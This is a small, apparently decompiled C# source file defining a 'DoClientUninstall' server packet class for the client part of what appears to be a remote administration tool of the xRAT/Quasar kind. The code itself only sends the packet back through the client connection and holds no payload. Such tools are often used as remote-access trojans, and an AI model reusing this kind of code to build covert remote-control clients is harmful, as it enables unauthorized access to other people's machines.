using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x020000DD RID: 221
	[Serializable]
	public class DoClientUninstall : IPacket
	{
		// Token: 0x06000598 RID: 1432 RVA: 0x00004AE1 File Offset: 0x00002CE1
		public void Execute(Client client)
		{
			client.Send<DoClientUninstall>(this);
		}
	}
}
